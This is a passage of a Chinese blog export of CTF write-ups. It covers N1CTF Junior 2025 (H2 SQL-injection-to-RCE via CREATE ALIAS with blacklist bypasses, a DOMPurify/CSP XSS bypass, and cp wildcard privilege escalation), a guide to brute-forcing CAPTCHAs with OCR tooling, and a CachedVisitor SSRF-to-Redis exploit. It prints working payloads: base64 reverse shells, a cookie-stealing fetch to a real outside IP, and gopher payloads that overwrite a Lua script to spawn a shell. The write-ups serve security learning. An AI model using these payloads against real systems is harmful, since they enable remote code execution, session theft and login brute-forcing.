-aux命令看一下是否在运行：\n在运行，并且是root权限。基本你可以确定是打这个来提权了。\n看到这里的*，很熟悉的通配符提权，并且涉及到了cp命令，primary目录可写文件。如果可以创建名为../../../../flag的文件，那么很快就出了，但是在shell中，只会将/视作目录，所以是打不了的。\n后面找思路，想到了软链接，那么就是想着软链接链接到/flag目录，然后sh脚本会将软链接带的内容一起给设置为可读权限，需要注意的是，这里使用了-P选项，这个在cp时不会带符号链接，所以需要绕一下。网上搜，说是-a选项可以，打了一下没打出来，后面就没怎么打了。\n赛后再搜了一下，-L选项是可以打的，也就是说-L选项会让cp命令复制软链接指向的文件，而-P选项，只会复制软链接本身，所以打不了。\n参考文章：\nhttps://www.cnblogs.com/chentiao/p/17363300.html\n最后尝试如下：\n1 2 3 4 5 cd /var/www/html/primary echo \u0026gt; -L ln -s /flag flag123 cd ../backup cat flag123 就可以得到flag。需要注意，要等sh脚本执行完了再打：\n看j1rry师傅的文章，还可以打-H选项，是直接从cp --h选项里面翻出来的，学习一下，感觉通配符提权基本都是考的利用选项来提权。\nEasyDB java题，跟着复现一下。\njadx反编译一下，拿到本地来看一源码。审计路由，发现存在登录路由：\n跟进的代码查看，发现存在sql注入：\n这里是直接拼接进的username和password，所以是存在sql注入的。\n看一下是什么数据库：\nh2数据库，道行还浅，以为是打JDBC，搜到一个打H2数据库的文章：\nhttps://xz.aliyun.com/news/13371\n里面提到了一个如果可以执行任意H2 SQL的语句，可以通过Alias Script 来进行RCE，打的堆叠注入。参考如下代码：\n1 2 3 4 5 6 //创建别名，其实就是创建一个执行函数： CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; //调用SHELLEXEC执行命令 CALL SHELLEXEC(\u0026#39;id\u0026#39;); CALL SHELLEXEC(\u0026#39;whoami\u0026#39;); 看代码，可以知道这个是直接会将命令执行的结果回显到页面上的，那么现在就是看怎么进行注入。\n需要注意的是，在提交sql语句查询时，会先check()一下：\n也就是说有黑名单，黑名单如上。看了一下，是加了小写的，所以这里主要需要绕的是runtime和exec，看这个创建别名的语句，其实就是在里面自定义了一段java命令执行的代码，和正常的Java语句没有什么却比，绕的话还是很好绕的，可以使用unicode编码关键字+反射来进行尝试：\n1 2 3 4 5 6 7 8 9 //创建别名，其实就是创建一个执行函数： CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;); java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;); Object gettime = mGet.invoke(null); java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class); exee.invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); 然后简单精简一下，如下：\n1 2 3 4 5 6 //创建别名，其实就是创建一个执行函数： CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); 尝试如下构造，然后拼接如下：\n1 2 3 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); --\u0026#39; AND password = \u0026#39;%s\u0026#39; 这里是我是改成了没有回显的，直接在弹个shell即可：\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws Exception { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;);java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;);Object gettime = mGet.invoke(null);java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class);exee.invoke(gettime,cmd);return \u0026#34;123\u0026#34;; }$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- 没弹上，直接被解析成了exec关键字？可能就是这个原因，被waf了。看了一下其他解法，这里还可以使用拼接，比如：\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ void cmd(String cmd) throws Exception { String name = \u0026#34;Run\u0026#34;+\u0026#34;time\u0026#34;;Class clazz= Class.forName(\u0026#34;java.lang.\u0026#34;+name);java.lang.reflect.Method mGet = clazz.getDeClaredMethod(\u0026#34;get\u0026#34;+name);Object gettime = (Object)mGet.invoke(null);gettime.getClass().getDeclaredMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- 但是构造的语句总是有问题，直接用别人的了，大概如下：\n1 admin\u0026#39;; CREATE ALIAS evil AS $$void jerry(String cmd) throws Exception{ String R=\u0026#34;R\u0026#34;+\u0026#34;untime\u0026#34;;Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;java.lang.\u0026#34;+R);Object rt=c.getMethod(\u0026#34;get\u0026#34;+R).invoke(null);c.getMethod(\u0026#34;exe\u0026#34;+\u0026#34;c\u0026#34;,String.class).invoke(rt,cmd);}$$;CALL evil(\u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#39;);-- 确实成功弹起了，对比了一下，问题可能存在于类型转换的问题。修修改改自己的poc，还是打不出来，不多纠结了。还可以base64编码这样打：\n1 \u0026#39;;CREATE ALIAS hello AS $$ String hello() throws Exception { Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(\u0026#34;amF2YS5sYW5nLlJ1bnRpbWU=\u0026#34;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;Z2V0UnVudGltZQ==\u0026#34;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;ZXhlYw==\u0026#34;)), String[].class);m2.invoke(o, new Object[]{new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, new String(java.util.Base64.getDecoder().decode(\u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=\u0026#34;))}});return null; }$$; CALL hello();-- 最后打就行了：\n注意url编码，以及这个别名应该只能创一次，否则需要重新开环境。最后拿到flag：\n——————\n参考：\nhttps://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#gavatar\ndisplay hint：用iframe嵌入子页面可以重新唤起DOM解析器解析script标签\n——————\n同样是给了docker源码的，node.js。审计源代码，可以看到同样是一个XSS操作，然后有csp限制：\n1 2 3 4 5 6 const csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#39;Content-Security-Policy\u0026#39;, csp); next(); }); app.js文件内容，可以知道会将所有的路由都设置上了这个限制。\n看app.js文件，可以看到是对404页面进行了处理的：\n1 2 3 app.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 页面 这里和SekaiCTF 2024 Tagless题很像。那么现在来看一下回显：\n但是并不能解析为js代码：\n控制台也没有看到CSP限制的报错。\n再继续看代码，还可以看到有向bot发起请求的地方：\n跟进visit()就到了bot的定义代码，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const HOST = \u0026#39;localhost:3000\u0026#39;; const FLAG = process.env.FLAG ?? \u0026#39;flag{test}\u0026#39;; function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } const visit = async (text) =\u0026gt; { const browser = await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;] }); await browser.setCookie({ name: \u0026#39;flag\u0026#39;, value: FLAG, domain: HOST, path: \u0026#39;/\u0026#39;, httpOnly: false }); const page = await browser.newPage(); await page.goto(`http://${HOST}/?text=${encodeURI(text)}`); await sleep(5000); await page.close(); } module.exports = {visit}; 可以看到会在bot中带上flag。然后设置了httponly为false，可以通过XSS来获取。并且这里bot的访问逻辑是只访问/路由并带上我传参的text，这里就是需要利用的点。\n现在来看前端引用的js，是一个DOM型XSS：\n获取text参数，然后将其base64解码后再检验一下，check的函数内容为：\n1 2 3 4 5 6 7 function sanitizeContent(text) { // Only allow \u0026lt;h1\u0026gt;, \u0026lt;h2\u0026gt;, tags and plain text const config = { ALLOWED_TAGS: [\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;] }; return DOMPurify.sanitize(text, config); } 这里利用到了DOMPurify来检验，这是一个用于清理HTML、MathML和SVG的JavaScript的库，也就是可以用来防范XSS攻击。搜索这个库的漏洞，可以得到如下文章：\n《利用突变XSS绕过DOMPurify 2.0.0 》\n但是我们这里版本为DOMPurify 3.2.3，现在并没有现成的POC来打。\n在index.js文件中，有一个点值得注意一下：\n1 2 textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 这里提到了innerHTML和innerText，用一个代码来说明这两个之间的区别：\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; 输出为：\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; Hello World 然后稍微改一点代码：\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; 输出为：\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/p\u0026gt; Hello \u0026lt;strong\u0026gt;World 从两个结果的对比，可以知道，这里的innerHTML用于获取或设置元素的 HTML 内容，包括所有的 HTML 标签，而innerText则是会解析HTML标签为文本，如果有HTML编码内容，那么就会将其解码一次。可以浅显理解为innerHTML就是获取全部HTML标签的内容，而innerText则是HTML渲染一次，类似于前端渲染的效果。\n那么这样看来，源代码是存在漏洞的，再粘过来一下：\n1 2 textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 在这里，可以尝试将sanitizedText的内容HTML编码一下，然后textInput.innerText会将其渲染，也就是HTML解码一次。并将其赋值给了内容显示，这样我们就可以在前端显示一个HTML标签出来，尝试如下：\n编码：\n然后base64编码一次传进去。\n成功渲染：\n这里在预览时就在前端渲染成了一个标签。但是不会解析。\n经过前面的构造，那么contentDisplay前端渲染时就会被渲染为js标签：\n但是并没有解析，这是因为内容是动态放置在 \u0026lt;div\u0026gt; 内的，并且由于使用了innerHTML，因此脚本没有执行。这里主要的利用点在contentDisplay，通过将contentDisplay.innerHTML设置为一个正常的html标签，然后插入到DOM树中。（这段代码设计得秒呀）\n都是没有解析。那么看此时的Hint：用iframe嵌入子页面可以重新唤起DOM解析器解析script标签。\n那么是限制了\u0026lt;script\u0026gt;标签的解析？\n尝试一下在404页面使用\u0026lt;iframe\u0026gt;标签嵌入前面的/路由：\n似乎是因为?这个get传参符号后面全都被舍弃了？那么嵌套一下404页面：\n还是不行，同时，\u0026lt;iframe\u0026gt;标签的src属性还可以直接嵌套javascript协议来直接执行代码，如：\n1 \u0026lt;iframe src=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 同样的还有\u0026lt;iframe\u0026gt;还有一个srcdoc属性，这个属性可以直接引入\u0026lt;script\u0026gt;标签，如：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 并且不受frame-src的影响，虽然这道题的CSP没有设置frame-src，但是可以注意一下，非常的好用。\n但是在这里都没有解析。\n对于\u0026lt;iframe\u0026gt;标签的利用，如下文章说的比较清楚：\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp\n还是不会呀，看了一下别人的wp，是在/路由进行的弹窗，唉，思维还是定式了，还是想着sekaictf的那套打法，那么如下打（可以直接打src，也可以打srcdoc）：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 用这个payload，还是之前的操作，HTML编码，然后base64编码。\n1 http://localhost:53447/?text=Jmx0O2lmcmFtZSBzcmNkb2M9IiZsdDtoMSZndDtoZWxsbyZsdDsvaDEmZ3Q7Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0OyImZ3Q7Jmx0Oy9pZnJhbWUmZ3Q7 最后效果如下：\n报错了，那么现在就是CSP绕过了，script-src设置为了self。这个就是sekaictf 2024的熟悉操作了，这里直接利用404页面构造即可，还是那个操作，本地引用，前面闭合成多行注释符，后面直接的那行注释掉，留一个完整的js代码，还是用fetch()函数：\n然后让iframe来自己引入这个页面：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 然后还是没弹成功，猜是不是这里两个双引号导致直接出错了，fetch()函数还可以使用反引号（`）指定地址，改成如下这个即可：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#39;/**/fetch(`http://47.100.223.173:2333/`+document.cookie)//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 然后还是之前的操作，HTML编码后在base64编码，注意要抓包传参，否则浏览器会url编码一次，导致无法成功：\n最后成功拿到flag：\n最后说明一个点：在其他题目中测试，同样的情况，\u0026lt;script\u0026gt;不解析，放在\u0026lt;div\u0026gt;标签中，应该同样是因为innerHTML，这个hint可以用来绕过这个点，并且其他题测试也是同样可以绕过的。\n————\n总结：很有意思的一道题，我还得练呀，还是应该想到还有/路由有前端渲染的操作，思维还得再开点。\n部分出题人的wp：\nhttps://gist.github.com/X1r0z/0c6a4323fd600a07091d6392cb9c77b5\n","date":"2025-02-17T00:19:41+08:00","permalink":"https://fupanc-w1n.github.io/p/n1ctf-junior-2025/","title":"N1CTF Junior 2025"},{"content":"验证码爆破 现在偶尔遇到验证码爆破这东西了，这里还是来记录一下配置及使用方法，但是这个爆破方法也只在一定情况下使用。\n对于验证码的其他情况，可以看一看第三个参考文章。\ncaptcha-killer-modified 工具配置 一个burp插件，地址：https://github.com/f0ng/captcha-killer-modified/releases/tag/0.24.3\n先在给的工具地址选下载与启动burp的java版本适配的jar包，我这里是直接看的本地java版本，所以这里直接选择java8即可：\n然后需要配置一下python的环境，这里需要安装如下的库：\n1 2 3 4 5 flask ddddocr Pillow==9.5.0 aiohttp==3.8.3 argparse==1.1 直接将其写入到一个requirements.txt文件一步下载即可，这里我用的python的版本是python3.8，写好后直接如下安装即可：\n1 pip38 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple 后面使用时会使用如下脚本，现在先不说：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) 然后就是在burp上配置一下插件，直接在上边栏找到extension，然后如下配置即可：\n如下就是配置好了：\n后面就直接用一道题来说明后面该怎么用。\n例题说明 2024国城杯ez_Gallery 这里就简单说说验证码爆破的步骤，后续的解题就不说了。\n开题如下：\n可以看出来就是一个登录框+验证码，在这里我们可以看一下这个验证码的生成情况：\n经测试发现是通过一个url可查看，并且这里刷新一次换一个验证码，在这里我们直接将其发送给burp，并用captcha来获取:\n然后去到插件页面，点击获取，得到验证码即为成功（这里识别到了验证码，但是不用管，继续跟着后面走就行）：\n然后启动前面的python脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) 再来到配置的下面部分，在Request template输入框中右键，选择ddddocr模板：\n然后将端口改成本地运行的端口并点击识别：\n然后就成功了：\n然后回到原先登录框这里，随便输入将其发送到爆破模块，将密码和验证码设置为变量：\npayload1就是正常的字典，Payload2如下设置，选择扩展生成：\n然后还可以设置一下资源池，注意应该需要调一下线程，新建一个就行，这里是设置的一秒一个请求，防止验证码被重复使用（确实需要调线程）：\n然后点击start，最后成功爆破出来：\n在工具的配置页面是可以看到识别效果的：\n——————\n一般验证码爆破适用于验证码是一个url生成的，还是多尝试。还有问题的话看参考文章。\nPKAV工具 地址：https://github.com/estell-yf/PKAV\n这里直接就是一个图形化工具，直接讲怎么用吧：\n[NSSCTF 3rd]NSS影院 NSS影视，你值得拥有\n——————\n开题，信息收集，可以知道是php，扫目录扫到www.zip，访问拿到源码，给了一个文件：\n感觉是一个字典，测了一下网站，应该是需要登录的，找了一圈，在咨询下有一个test：\n点进去就行，这是一个建站测试，可以看到作者，以及flag部分路径：\n即\n1 2 d3f4u1t /Fl4g_is_h3r3 再扫一下这个路径下的文件：\n访问login.php，就是一个登录框：\n然后可以打开验证码，发现是通过url来生成的验证码，这里先是尝试用captcha工具，然后成功爆破出来了：\n密码是 princess! ，登录进去就拿到了flag：\n——————\n但这里还是主要说明PKAV工具的使用：\n复制验证码的url到PKAV工具中：\n然后翻到下载点识别测试即可：\n然后抓登录的HTTP包，将其丢进PKAV工具：\n分别设置爆破的变量以及验证码标记。\n然后设置密码字典即可：\n再然后到重放选项页面设置，根据实际情况调整：\n然后在发包器开始爆破就行：\n最后也是成功爆破出来了：\n总的来说就是需要设置变体，验证码识别，重放选项，然后在发包器发包即可。\n但其实感觉直接使用burp插件就行了，也比较方便。\n参考配置文章：\nhttps://blog.csdn.net/qq_33906495/article/details/135367789\nhttps://www.52pojie.cn/thread-1944555-1-1.html\nhttps://blog.csdn.net/weixin_39190897/article/details/86539542\n","date":"2025-02-08T15:40:19+08:00","permalink":"https://fupanc-w1n.github.io/p/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/","title":"验证码爆破"},{"content":"WEB CachedVisitor 有docker。这个比赛我也没有报名，以为不是CTF，早知道就和队友报了，不然就进线下了🥵。\n——————————\n给了docker，简单审一下docker，是执行的一个lua脚本，然后nginx后端。\n看了一下源代码：\nmain.lua：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 local function read_file(filename) local file = io.open(filename, \u0026#34;r\u0026#34;) if not file then print(\u0026#34;Error: Could not open file \u0026#34; .. filename) return nil end local content = file:read(\u0026#34;*a\u0026#34;) file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\u0026#34;##LUA_START##(.-)##LUA_END##\u0026#34;) if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\u0026#34;Error executing Lua code: \u0026#34;, result) end else print(\u0026#34;Error loading Lua code: \u0026#34;, err) end else print(\u0026#34;Error: No valid Lua code block found.\u0026#34;) end end local function main() local filename = \u0026#34;/scripts/visit.script\u0026#34; local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() visit.script：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ##LUA_START## local curl = require(\u0026#34;cURL\u0026#34;) local redis = require(\u0026#34;resty.redis\u0026#34;) ngx.req.read_body() local args = ngx.req.get_uri_args() local url = args.url if not url then ngx.say(\u0026#34;URL parameter is missing!\u0026#34;) return end local red = redis:new() red:set_timeout(1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;Failed to connect to Redis: \u0026#34;, err) return end local res, err = red:get(url) if res and res ~= ngx.null then ngx.say(res) return end local c = curl.easy { url = url, timeout = 5, connecttimeout = 5 } local response_body = {} c:setopt_writefunction(table.insert, response_body) local ok, err = pcall(c.perform, c) if not ok then ngx.say(\u0026#34;Failed to perform request: \u0026#34;, err) c:close() return end c:close() local response_str = table.concat(response_body) local ok, err = red:setex(url, 3600, response_str) if not ok then ngx.say(\u0026#34;Failed to save response in Redis: \u0026#34;, err) return end ngx.say(response_str) ##LUA_END## 可以看到这里的代码运行，在visit.script文件就是一个连接redis，然后发送url请求的过程。\n在mian.lua中，可以知道主要逻辑就是运行visit.script文件。\n然后就看题吧。\n开题如下：\nssrf，并且可以读文件：\n但是不能直接读flag，权限不够：\n其实这个在dockerfile中是有说明的：\n1 2 3 4 COPY flag /flag COPY readflag /readflag RUN chmod 400 /flag RUN chmod +xs /readflag 可以看到赋予权限的操作。\n尝试打redis，这样先用dict协议查看一次redis的基本信息：\n可以看到redis的版本，这里应该是不能打redis主从复制的来getshell，看docker文件，是需要执行/readflag文件来读取文件的。\n错误做法 这里是先踩了一个坑的，也来记录一下，后端没有执行什么语言，所以不能写php文件，这里我想使用gopherus工具，所以只有用来尝试写定时任务来反弹shell：\n这里简单改一下payload即可，弹到2333端口去，如下：\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/47.100.223.173/2333%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 然后抓包url编码一下发包：\n然后在vps上监听一下2333端口。\n但是一直没成功，然后可以使用dict协议来看是否成功写入：\n查看这个1的内容：\n可以看出来就是一个反弹shell的操作。\n后面一直都打不成功。想了一下，以为是环境不出网，但是发现是出网的：\n继续想，可能是因为环境中都不能打定时任务，在dockerfile中都没有下载crontab这个命令：\n所以是打不了的。需要想其他的方法。\n后面我就一直看文件，想到了nginx配置是否有突破点，这个同样是在docker中给了的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html; } location /visit { default_type text/plain; content_by_lua_file /usr/local/openresty/nginx/lua/main.lua; } lua_code_cache off; } } 这里关键就是如下代码：\n1 lua_code_cache off; 这里将lua_code_cache设置为off，说明nginx不会缓存之前的编译效果，也就是每次发起请求，nginx都会重新编译这个lua脚本，也就是main.lua文件。\n纵观main.lua文件，可以发现是引用了visit.script文件的，那么现在就迸发出一个思路，可以尝试覆盖visit.script文件，将这个文件内容改为是一个命令执行的地方，然后重新发起请求，就可以执行这个visit.script文件，从而成功达到一次命令执行。\n写文件的话就是参照redis中的写php文件的操作。\n让gpt给了一个弹shell的命令：\n1 ##LUA_START##os.execute(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;)##LUA_END## 这里我是先尝试了sec_tool工具，但是一直打不成功，这里是可以用gopherus工具的，但是需要改一下，结果还是没打通，看了一下别人的wp，用的弹shell的命令如下：\n1 ##LUA_START##os.execute(\u0026#34;bash -c \u0026#39;sh -i \u0026amp;\u0026gt;/dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)##LUA_END## 又是这个原因，后面还是注意用更稳定的吧。\n所以直接用gopherus生成payload：\n这里是打的php文件，需要改一下payload，gopheru打这个用的RESP协议，学ssrf的时候就简单了解了，原payload：\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 这里就只需要改一下文件名以及长度：\n1 2 3 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename% .. ............ 0D%0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 改的地方用点标记出来了，就是改了一下文件名以及长度。\n然后将改了后的payload 再URL编码一下发包即可：\n第一次发包：\n然后再第二次发包，点一下send即可，成功弹上shell：\n然后再执行readflag文件即可：\n最后成功得到flag。\n这里还有队友打的用于直接执行然后回显到当前页面上的lua执行命令：\n1 2 3 ##LUA_START## ngx.say(io.popen(\u0026#34;/readflag\u0026#34;):read(\u0026#34;*all\u0026#34;)) ##LUA_END## ——————————————\n","date":"2025-02-05T13:05:10+08:00","permalink":"https://fupanc-w1n.github.io/p/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025wp/","title":"软件系统安全赛2025wp"},{"content":"JNDI 概述 Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。\n通过调用JNDI的API应用程序可以定位资源和其他程序对象。\nJNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NID（网络信息服务）、CORBA（公告对象请求代码系统结构）等。\n命名服务/目录服务 